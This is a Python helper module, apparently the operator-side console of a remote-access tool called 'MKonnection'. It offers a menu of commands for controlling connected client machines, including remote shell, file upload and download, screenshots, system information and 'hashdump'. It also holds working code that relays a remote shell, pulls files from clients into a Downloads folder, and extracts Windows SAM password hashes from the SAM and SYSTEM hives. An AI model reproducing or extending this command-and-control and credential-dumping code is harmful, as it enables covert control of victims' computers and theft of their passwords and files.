import os
import random

import pyfiglet


def print_help_client():
    commands = {
        "help": {
            "description": "Display this help message.",
            "usage": "help"
        },
        "close": {
            "description": "Close the client connection.",
            "usage": "close"
        },
        "upload": {
            "description": "Upload a file from the server to the client.",
            "usage": "upload <file_path>"
        },
        "download": {
            "description": "Download a file from the client to the server.",
            "usage": "download <file_path>"
        },
        "shell": {
            "description": "Open an interactive shell to execute commands on the client.",
            "usage": "shell"
        },
        "search": {
            "description": "Search any file in client file system",
            "usage": "seach <file path>"
        },
        "screenshot": {
            "description": "Take a screenshot of the client's screen.",
            "usage": "screenshot"
        },
        "hashdump": {
            "description": "Dump the file password hashes from the client.",
            "usage": "hashdump"
        },
        "getuid": {
            "description": "Get the user identifier on the client.",
            "usage": "getuid"
        },
        "ipconfig": {
            "description": "Display the network configuration on the client.",
            "usage": "ipconfig"
        },
        "ls": {
            "description": "List files and directories in the client's current directory.",
            "usage": "ls"
        },
        "pwd": {
            "description": "Display the current working directory on the client.",
            "usage": "pwd"
        },
        "sysinfo": {
            "description": "Display system information on the client.",
            "usage": "sysinfo"
        }
    }

    print_help(commands)


def print_help_manager():
    commands = {
        "exit": {
            "description": "Close the server or disconnect every clients.",
            "usage": "exit"
        },
        "list": {
            "description": "List currently connected clients.",
            "usage": "list"
        },
        "use": {
            "description": "Select a client to interact with.",
            "usage": "use <client_id>"
        }
    }
    print_help(commands)


def print_help(commands):
    print(f"{'Command':<15}{'Description and Usage':<50}")
    print("=" * 65)
    for command, info in commands.items():
        description = info["description"]
        usage = info["usage"]
        print(f"{command:<15}{description:<50}")
        print(f"{'':<15}{'Usage: ' + usage:<50}")


def print_mko_banner():
    # banner with pyfiglet
    print(pyfiglet.figlet_format("MKonnection-", font="slant"))


def print_mko_prefix():
    print("MKo > ", end="", flush=True)


def print_mko_client(client_id):
    print(f"MKo (client {client_id}) > ", end="", flush=True)


def use_manager(thread_id, thread_to_conn, client_queues):
    print(f"You are now using client {thread_id}")
    print_mko_client(thread_id)
    # Interact with the selected thread
    while True:
        sub_command = input()

        if sub_command.lower() == "exit":
            break
        elif sub_command.lower() == "":
            print_mko_client(thread_id)

        if sub_command:
            conn = thread_to_conn[thread_id]
            client_queues[conn].put(sub_command)

        if sub_command == "close":
            return "close"
        elif sub_command == "shell":
            return "shell"


def upload_file(file_path, conn):
    file_size = os.path.getsize(file_path)
    conn.send(file_size.to_bytes(8, 'big'))

    nbr_of_dot = 1
    with open(file_path, "rb") as file:
        while chunk := file.read(1024):
            conn.send(chunk)
            percent = conn.recv(1024).decode('utf-8')
            nbr_of_dot = print_progress(percent, nbr_of_dot)


def print_progress(progress, nbr_of_dot):
    print("\rReceiving (" + progress + "%)" + "." * nbr_of_dot, end=" ", flush=True)
    if nbr_of_dot == 3:
        return 1
    else:
        return nbr_of_dot + 1


def download_file(file_path, conn):
    filename, file_path = format_filename(file_path)


    # check if Download folder exists
    if not os.path.exists("Downloads"):
        os.makedirs("Downloads")

    # receive file status => check if file exists and is readable
    file_status = conn.recv(1024).decode('utf-8')
    if file_status == "File not found":
        print("File not found or not readable access.")


    else:
        # receive the file size
        file_size = int.from_bytes(conn.recv(8), 'big')
        # print(f"Expected file size: {file_size} bytes")

        # receive the file
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + "_"
        download_path = "Downloads/" + random_str + filename

        nbr_of_dot = 1
        with open(download_path, "wb") as file:
            received = 0
            while received < file_size:
                chunk = conn.recv(min(1024, file_size - received))
                if not chunk:
                    raise EOFError('Connection closed before receiving all the data')
                file.write(chunk)
                received += len(chunk)
                # calculate progress
                progress = str(round(((received / file_size) * 100)))
                nbr_of_dot = print_progress(progress, nbr_of_dot)

        return download_path
def interact_shell(conn, client_id):
    print(f"MKo Shell (client {client_id}) > ", end="")
    conn.send("shell".encode('utf-8'))

    while True:
        command = input()

        if command.lower() == "exit":
            conn.send(command.encode('utf-8'))
            print(conn.recv(1024).decode('utf-8'))
            break

        if command.lower() == "":
            continue

        conn.send(command.encode('utf-8'))
        output = conn.recv(1024).decode('utf-8')
        print(output)

        print(f"MKo Shell (client {client_id}) > ", end="")


def format_filename(commande):
    try:
        file_path = commande.split(" ", 1)[1]
    except IndexError:
        file_path = commande

    file_path = file_path.replace('"', '')
    if '/' in file_path:
        return file_path.split("/")[-1], file_path
    elif '\\' in file_path:
        return file_path.split("\\")[-1], file_path
    else:
        return file_path, file_path

def secret_dump_from_file(sam_path, system_path):
    try:
        # Initialize LocalOperations class
        local_ops = LocalOperations(system_path)
        boot_key = local_ops.getBootKey()

        # Dump SAM hashes
        sam_hashes = SAMHashes(sam_path, boot_key, isRemote=False)
        sam_hashes.dump()
        sam_hashes.export('Downloads/sam_hashes')

        print("Dump completed successfully.")

    except Exception as e:
        print(f"An error occurred: {e}")